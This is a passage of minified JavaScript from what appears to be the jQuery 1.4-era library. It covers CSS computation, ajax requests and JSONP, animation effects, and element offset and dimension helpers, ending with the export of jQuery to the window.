a.getPropertyValue(b);if(b==="opacity"&&f==="")f="1"}else if(a.currentStyle){d=b.replace(ia,ja);f=a.currentStyle[b]||a.currentStyle[d];if(!mb.test(f)&&nb.test(f)){b=e.left;var j=a.runtimeStyle.left;a.runtimeStyle.left=a.currentStyle.left;e.left=d==="fontSize"?"1em":f||0;f=e.pixelLeft+"px";e.left=b;a.runtimeStyle.left=j}}return f},swap:function(a,b,d){var f={};for(var e in b){f[e]=a.style[e];a.style[e]=b[e]}d.call(a);for(e in b)a.style[e]=f[e]}});if(c.expr&&c.expr.filters){c.expr.filters.hidden=function(a){var b=
a.offsetWidth,d=a.offsetHeight,f=a.nodeName.toLowerCase()==="tr";return b===0&&d===0&&!f?true:b>0&&d>0&&!f?false:c.curCSS(a,"display")==="none"};c.expr.filters.visible=function(a){return!c.expr.filters.hidden(a)}}var sb=J(),tb=/<script(.|\s)*?\/script>/gi,ub=/select|textarea/i,vb=/color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week/i,N=/=\?(&|$)/,ka=/\?/,wb=/(\?|&)_=.*?(&|$)/,xb=/^(\w+:)?\/\/([^\/?#]+)/,yb=/%20/g,zb=c.fn.load;c.fn.extend({load:function(a,b,d){if(typeof a!==
"string")return zb.call(this,a);else if(!this.length)return this;var f=a.indexOf(" ");if(f>=0){var e=a.slice(f,a.length);a=a.slice(0,f)}f="GET";if(b)if(c.isFunction(b)){d=b;b=null}else if(typeof b==="object"){b=c.param(b,c.ajaxSettings.traditional);f="POST"}var j=this;c.ajax({url:a,type:f,dataType:"html",data:b,complete:function(i,o){if(o==="success"||o==="notmodified")j.html(e?c("<div />").append(i.responseText.replace(tb,"")).find(e):i.responseText);d&&j.each(d,[i.responseText,o,i])}});return this},
serialize:function(){return c.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?c.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||ub.test(this.nodeName)||vb.test(this.type))}).map(function(a,b){a=c(this).val();return a==null?null:c.isArray(a)?c.map(a,function(d){return{name:b.name,value:d}}):{name:b.name,value:a}}).get()}});c.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),
function(a,b){c.fn[b]=function(d){return this.bind(b,d)}});c.extend({get:function(a,b,d,f){if(c.isFunction(b)){f=f||d;d=b;b=null}return c.ajax({type:"GET",url:a,data:b,success:d,dataType:f})},getScript:function(a,b){return c.get(a,null,b,"script")},getJSON:function(a,b,d){return c.get(a,b,d,"json")},post:function(a,b,d,f){if(c.isFunction(b)){f=f||d;d=b;b={}}return c.ajax({type:"POST",url:a,data:b,success:d,dataType:f})},ajaxSetup:function(a){c.extend(c.ajaxSettings,a)},ajaxSettings:{url:location.href,
global:true,type:"GET",contentType:"application/x-www-form-urlencoded",processData:true,async:true,xhr:A.XMLHttpRequest&&(A.location.protocol!=="file:"||!A.ActiveXObject)?function(){return new A.XMLHttpRequest}:function(){try{return new A.ActiveXObject("Microsoft.XMLHTTP")}catch(a){}},accepts:{xml:"application/xml, text/xml",html:"text/html",script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},lastModified:{},etag:{},ajax:function(a){function b(){e.success&&
e.success.call(k,o,i,x);e.global&&f("ajaxSuccess",[x,e])}function d(){e.complete&&e.complete.call(k,x,i);e.global&&f("ajaxComplete",[x,e]);e.global&&!--c.active&&c.event.trigger("ajaxStop")}function f(q,p){(e.context?c(e.context):c.event).trigger(q,p)}var e=c.extend(true,{},c.ajaxSettings,a),j,i,o,k=a&&a.context||e,n=e.type.toUpperCase();if(e.data&&e.processData&&typeof e.data!=="string")e.data=c.param(e.data,e.traditional);if(e.dataType==="jsonp"){if(n==="GET")N.test(e.url)||(e.url+=(ka.test(e.url)?
"&":"?")+(e.jsonp||"callback")+"=?");else if(!e.data||!N.test(e.data))e.data=(e.data?e.data+"&":"")+(e.jsonp||"callback")+"=?";e.dataType="json"}if(e.dataType==="json"&&(e.data&&N.test(e.data)||N.test(e.url))){j=e.jsonpCallback||"jsonp"+sb++;if(e.data)e.data=(e.data+"").replace(N,"="+j+"$1");e.url=e.url.replace(N,"="+j+"$1");e.dataType="script";A[j]=A[j]||function(q){o=q;b();d();A[j]=w;try{delete A[j]}catch(p){}z&&z.removeChild(C)}}if(e.dataType==="script"&&e.cache===null)e.cache=false;if(e.cache===
false&&n==="GET"){var r=J(),u=e.url.replace(wb,"$1_="+r+"$2");e.url=u+(u===e.url?(ka.test(e.url)?"&":"?")+"_="+r:"")}if(e.data&&n==="GET")e.url+=(ka.test(e.url)?"&":"?")+e.data;e.global&&!c.active++&&c.event.trigger("ajaxStart");r=(r=xb.exec(e.url))&&(r[1]&&r[1]!==location.protocol||r[2]!==location.host);if(e.dataType==="script"&&n==="GET"&&r){var z=s.getElementsByTagName("head")[0]||s.documentElement,C=s.createElement("script");C.src=e.url;if(e.scriptCharset)C.charset=e.scriptCharset;if(!j){var B=
false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){B=true;b();d();C.onload=C.onreadystatechange=null;z&&C.parentNode&&z.removeChild(C)}}}z.insertBefore(C,z.firstChild);return w}var E=false,x=e.xhr();if(x){e.username?x.open(n,e.url,e.async,e.username,e.password):x.open(n,e.url,e.async);try{if(e.data||a&&a.contentType)x.setRequestHeader("Content-Type",e.contentType);if(e.ifModified){c.lastModified[e.url]&&x.setRequestHeader("If-Modified-Since",
c.lastModified[e.url]);c.etag[e.url]&&x.setRequestHeader("If-None-Match",c.etag[e.url])}r||x.setRequestHeader("X-Requested-With","XMLHttpRequest");x.setRequestHeader("Accept",e.dataType&&e.accepts[e.dataType]?e.accepts[e.dataType]+", */*":e.accepts._default)}catch(ga){}if(e.beforeSend&&e.beforeSend.call(k,x,e)===false){e.global&&!--c.active&&c.event.trigger("ajaxStop");x.abort();return false}e.global&&f("ajaxSend",[x,e]);var g=x.onreadystatechange=function(q){if(!x||x.readyState===0||q==="abort"){E||
d();E=true;if(x)x.onreadystatechange=c.noop}else if(!E&&x&&(x.readyState===4||q==="timeout")){E=true;x.onreadystatechange=c.noop;i=q==="timeout"?"timeout":!c.httpSuccess(x)?"error":e.ifModified&&c.httpNotModified(x,e.url)?"notmodified":"success";var p;if(i==="success")try{o=c.httpData(x,e.dataType,e)}catch(v){i="parsererror";p=v}if(i==="success"||i==="notmodified")j||b();else c.handleError(e,x,i,p);d();q==="timeout"&&x.abort();if(e.async)x=null}};try{var h=x.abort;x.abort=function(){x&&h.call(x);
g("abort")}}catch(l){}e.async&&e.timeout>0&&setTimeout(function(){x&&!E&&g("timeout")},e.timeout);try{x.send(n==="POST"||n==="PUT"||n==="DELETE"?e.data:null)}catch(m){c.handleError(e,x,null,m);d()}e.async||g();return x}},handleError:function(a,b,d,f){if(a.error)a.error.call(a.context||a,b,d,f);if(a.global)(a.context?c(a.context):c.event).trigger("ajaxError",[b,a,f])},active:0,httpSuccess:function(a){try{return!a.status&&location.protocol==="file:"||a.status>=200&&a.status<300||a.status===304||a.status===
1223||a.status===0}catch(b){}return false},httpNotModified:function(a,b){var d=a.getResponseHeader("Last-Modified"),f=a.getResponseHeader("Etag");if(d)c.lastModified[b]=d;if(f)c.etag[b]=f;return a.status===304||a.status===0},httpData:function(a,b,d){var f=a.getResponseHeader("content-type")||"",e=b==="xml"||!b&&f.indexOf("xml")>=0;a=e?a.responseXML:a.responseText;e&&a.documentElement.nodeName==="parsererror"&&c.error("parsererror");if(d&&d.dataFilter)a=d.dataFilter(a,b);if(typeof a==="string")if(b===
"json"||!b&&f.indexOf("json")>=0)a=c.parseJSON(a);else if(b==="script"||!b&&f.indexOf("javascript")>=0)c.globalEval(a);return a},param:function(a,b){function d(i,o){if(c.isArray(o))c.each(o,function(k,n){b||/\[\]$/.test(i)?f(i,n):d(i+"["+(typeof n==="object"||c.isArray(n)?k:"")+"]",n)});else!b&&o!=null&&typeof o==="object"?c.each(o,function(k,n){d(i+"["+k+"]",n)}):f(i,o)}function f(i,o){o=c.isFunction(o)?o():o;e[e.length]=encodeURIComponent(i)+"="+encodeURIComponent(o)}var e=[];if(b===w)b=c.ajaxSettings.traditional;
if(c.isArray(a)||a.jquery)c.each(a,function(){f(this.name,this.value)});else for(var j in a)d(j,a[j]);return e.join("&").replace(yb,"+")}});var la={},Ab=/toggle|show|hide/,Bb=/^([+-]=)?([\d+-.]+)(.*)$/,W,va=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];c.fn.extend({show:function(a,b){if(a||a===0)return this.animate(K("show",3),a,b);else{a=0;for(b=this.length;a<b;a++){var d=c.data(this[a],"olddisplay");
this[a].style.display=d||"";if(c.css(this[a],"display")==="none"){d=this[a].nodeName;var f;if(la[d])f=la[d];else{var e=c("<"+d+" />").appendTo("body");f=e.css("display");if(f==="none")f="block";e.remove();la[d]=f}c.data(this[a],"olddisplay",f)}}a=0;for(b=this.length;a<b;a++)this[a].style.display=c.data(this[a],"olddisplay")||"";return this}},hide:function(a,b){if(a||a===0)return this.animate(K("hide",3),a,b);else{a=0;for(b=this.length;a<b;a++){var d=c.data(this[a],"olddisplay");!d&&d!=="none"&&c.data(this[a],
"olddisplay",c.css(this[a],"display"))}a=0;for(b=this.length;a<b;a++)this[a].style.display="none";return this}},_toggle:c.fn.toggle,toggle:function(a,b){var d=typeof a==="boolean";if(c.isFunction(a)&&c.isFunction(b))this._toggle.apply(this,arguments);else a==null||d?this.each(function(){var f=d?a:c(this).is(":hidden");c(this)[f?"show":"hide"]()}):this.animate(K("toggle",3),a,b);return this},fadeTo:function(a,b,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,d)},
animate:function(a,b,d,f){var e=c.speed(b,d,f);if(c.isEmptyObject(a))return this.each(e.complete);return this[e.queue===false?"each":"queue"](function(){var j=c.extend({},e),i,o=this.nodeType===1&&c(this).is(":hidden"),k=this;for(i in a){var n=i.replace(ia,ja);if(i!==n){a[n]=a[i];delete a[i];i=n}if(a[i]==="hide"&&o||a[i]==="show"&&!o)return j.complete.call(this);if((i==="height"||i==="width")&&this.style){j.display=c.css(this,"display");j.overflow=this.style.overflow}if(c.isArray(a[i])){(j.specialEasing=
j.specialEasing||{})[i]=a[i][1];a[i]=a[i][0]}}if(j.overflow!=null)this.style.overflow="hidden";j.curAnim=c.extend({},a);c.each(a,function(r,u){var z=new c.fx(k,j,r);if(Ab.test(u))z[u==="toggle"?o?"show":"hide":u](a);else{var C=Bb.exec(u),B=z.cur(true)||0;if(C){u=parseFloat(C[2]);var E=C[3]||"px";if(E!=="px"){k.style[r]=(u||1)+E;B=(u||1)/z.cur(true)*B;k.style[r]=B+E}if(C[1])u=(C[1]==="-="?-1:1)*u+B;z.custom(B,u,E)}else z.custom(B,u,"")}});return true})},stop:function(a,b){var d=c.timers;a&&this.queue([]);
this.each(function(){for(var f=d.length-1;f>=0;f--)if(d[f].elem===this){b&&d[f](true);d.splice(f,1)}});b||this.dequeue();return this}});c.each({slideDown:K("show",1),slideUp:K("hide",1),slideToggle:K("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"}},function(a,b){c.fn[a]=function(d,f){return this.animate(b,d,f)}});c.extend({speed:function(a,b,d){var f=a&&typeof a==="object"?a:{complete:d||!d&&b||c.isFunction(a)&&a,duration:a,easing:d&&b||b&&!c.isFunction(b)&&b};f.duration=c.fx.off?0:typeof f.duration===
"number"?f.duration:c.fx.speeds[f.duration]||c.fx.speeds._default;f.old=f.complete;f.complete=function(){f.queue!==false&&c(this).dequeue();c.isFunction(f.old)&&f.old.call(this)};return f},easing:{linear:function(a,b,d,f){return d+f*a},swing:function(a,b,d,f){return(-Math.cos(a*Math.PI)/2+0.5)*f+d}},timers:[],fx:function(a,b,d){this.options=b;this.elem=a;this.prop=d;if(!b.orig)b.orig={}}});c.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this);(c.fx.step[this.prop]||
c.fx.step._default)(this);if((this.prop==="height"||this.prop==="width")&&this.elem.style)this.elem.style.display="block"},cur:function(a){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];return(a=parseFloat(c.css(this.elem,this.prop,a)))&&a>-10000?a:parseFloat(c.curCSS(this.elem,this.prop))||0},custom:function(a,b,d){function f(j){return e.step(j)}this.startTime=J();this.start=a;this.end=b;this.unit=d||this.unit||"px";this.now=this.start;
this.pos=this.state=0;var e=this;f.elem=this.elem;if(f()&&c.timers.push(f)&&!W)W=setInterval(c.fx.tick,13)},show:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.show=true;this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur());c(this.elem).show()},hide:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.hide=true;this.custom(this.cur(),0)},step:function(a){var b=J(),d=true;if(a||b>=this.options.duration+this.startTime){this.now=
this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;for(var f in this.options.curAnim)if(this.options.curAnim[f]!==true)d=false;if(d){if(this.options.display!=null){this.elem.style.overflow=this.options.overflow;a=c.data(this.elem,"olddisplay");this.elem.style.display=a?a:this.options.display;if(c.css(this.elem,"display")==="none")this.elem.style.display="block"}this.options.hide&&c(this.elem).hide();if(this.options.hide||this.options.show)for(var e in this.options.curAnim)c.style(this.elem,
e,this.options.orig[e]);this.options.complete.call(this.elem)}return false}else{e=b-this.startTime;this.state=e/this.options.duration;a=this.options.easing||(c.easing.swing?"swing":"linear");this.pos=c.easing[this.options.specialEasing&&this.options.specialEasing[this.prop]||a](this.state,e,0,1,this.options.duration);this.now=this.start+(this.end-this.start)*this.pos;this.update()}return true}};c.extend(c.fx,{tick:function(){for(var a=c.timers,b=0;b<a.length;b++)a[b]()||a.splice(b--,1);a.length||
c.fx.stop()},stop:function(){clearInterval(W);W=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){c.style(a.elem,"opacity",a.now)},_default:function(a){if(a.elem.style&&a.elem.style[a.prop]!=null)a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit;else a.elem[a.prop]=a.now}}});if(c.expr&&c.expr.filters)c.expr.filters.animated=function(a){return c.grep(c.timers,function(b){return a===b.elem}).length};c.fn.offset="getBoundingClientRect"in s.documentElement?
function(a){var b=this[0];if(a)return this.each(function(e){c.offset.setOffset(this,a,e)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);var d=b.getBoundingClientRect(),f=b.ownerDocument;b=f.body;f=f.documentElement;return{top:d.top+(self.pageYOffset||c.support.boxModel&&f.scrollTop||b.scrollTop)-(f.clientTop||b.clientTop||0),left:d.left+(self.pageXOffset||c.support.boxModel&&f.scrollLeft||b.scrollLeft)-(f.clientLeft||b.clientLeft||0)}}:function(a){var b=
this[0];if(a)return this.each(function(r){c.offset.setOffset(this,a,r)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);c.offset.initialize();var d=b.offsetParent,f=b,e=b.ownerDocument,j,i=e.documentElement,o=e.body;f=(e=e.defaultView)?e.getComputedStyle(b,null):b.currentStyle;for(var k=b.offsetTop,n=b.offsetLeft;(b=b.parentNode)&&b!==o&&b!==i;){if(c.offset.supportsFixedPosition&&f.position==="fixed")break;j=e?e.getComputedStyle(b,null):b.currentStyle;
k-=b.scrollTop;n-=b.scrollLeft;if(b===d){k+=b.offsetTop;n+=b.offsetLeft;if(c.offset.doesNotAddBorder&&!(c.offset.doesAddBorderForTableAndCells&&/^t(able|d|h)$/i.test(b.nodeName))){k+=parseFloat(j.borderTopWidth)||0;n+=parseFloat(j.borderLeftWidth)||0}f=d;d=b.offsetParent}if(c.offset.subtractsBorderForOverflowNotVisible&&j.overflow!=="visible"){k+=parseFloat(j.borderTopWidth)||0;n+=parseFloat(j.borderLeftWidth)||0}f=j}if(f.position==="relative"||f.position==="static"){k+=o.offsetTop;n+=o.offsetLeft}if(c.offset.supportsFixedPosition&&
f.position==="fixed"){k+=Math.max(i.scrollTop,o.scrollTop);n+=Math.max(i.scrollLeft,o.scrollLeft)}return{top:k,left:n}};c.offset={initialize:function(){var a=s.body,b=s.createElement("div"),d,f,e,j=parseFloat(c.curCSS(a,"marginTop",true))||0;c.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"});b.innerHTML="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";
a.insertBefore(b,a.firstChild);d=b.firstChild;f=d.firstChild;e=d.nextSibling.firstChild.firstChild;this.doesNotAddBorder=f.offsetTop!==5;this.doesAddBorderForTableAndCells=e.offsetTop===5;f.style.position="fixed";f.style.top="20px";this.supportsFixedPosition=f.offsetTop===20||f.offsetTop===15;f.style.position=f.style.top="";d.style.overflow="hidden";d.style.position="relative";this.subtractsBorderForOverflowNotVisible=f.offsetTop===-5;this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==j;a.removeChild(b);
c.offset.initialize=c.noop},bodyOffset:function(a){var b=a.offsetTop,d=a.offsetLeft;c.offset.initialize();if(c.offset.doesNotIncludeMarginInBodyOffset){b+=parseFloat(c.curCSS(a,"marginTop",true))||0;d+=parseFloat(c.curCSS(a,"marginLeft",true))||0}return{top:b,left:d}},setOffset:function(a,b,d){if(/static/.test(c.curCSS(a,"position")))a.style.position="relative";var f=c(a),e=f.offset(),j=parseInt(c.curCSS(a,"top",true),10)||0,i=parseInt(c.curCSS(a,"left",true),10)||0;if(c.isFunction(b))b=b.call(a,
d,e);d={top:b.top-e.top+j,left:b.left-e.left+i};"using"in b?b.using.call(a,d):f.css(d)}};c.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),d=this.offset(),f=/^body|html$/i.test(b[0].nodeName)?{top:0,left:0}:b.offset();d.top-=parseFloat(c.curCSS(a,"marginTop",true))||0;d.left-=parseFloat(c.curCSS(a,"marginLeft",true))||0;f.top+=parseFloat(c.curCSS(b[0],"borderTopWidth",true))||0;f.left+=parseFloat(c.curCSS(b[0],"borderLeftWidth",true))||0;return{top:d.top-
f.top,left:d.left-f.left}},offsetParent:function(){return this.map(function(){for(var a=this.offsetParent||s.body;a&&!/^body|html$/i.test(a.nodeName)&&c.css(a,"position")==="static";)a=a.offsetParent;return a})}});c.each(["Left","Top"],function(a,b){var d="scroll"+b;c.fn[d]=function(f){var e=this[0],j;if(!e)return null;if(f!==w)return this.each(function(){if(j=wa(this))j.scrollTo(!a?f:c(j).scrollLeft(),a?f:c(j).scrollTop());else this[d]=f});else return(j=wa(e))?"pageXOffset"in j?j[a?"pageYOffset":
"pageXOffset"]:c.support.boxModel&&j.document.documentElement[d]||j.document.body[d]:e[d]}});c.each(["Height","Width"],function(a,b){var d=b.toLowerCase();c.fn["inner"+b]=function(){return this[0]?c.css(this[0],d,false,"padding"):null};c.fn["outer"+b]=function(f){return this[0]?c.css(this[0],d,false,f?"margin":"border"):null};c.fn[d]=function(f){var e=this[0];if(!e)return f==null?null:this;if(c.isFunction(f))return this.each(function(j){var i=c(this);i[d](f.call(this,j,i[d]()))});return"scrollTo"in
e&&e.document?e.document.compatMode==="CSS1Compat"&&e.document.documentElement["client"+b]||e.document.body["client"+b]:e.nodeType===9?Math.max(e.documentElement["client"+b],e.body["scroll"+b],e.documentElement["scroll"+b],e.body["offset"+b],e.documentElement["offset"+b]):f===w?c.css(e,d):this.css(d,typeof f==="string"?f:f+"px")}});A.jQuery=A.$=c})(window);
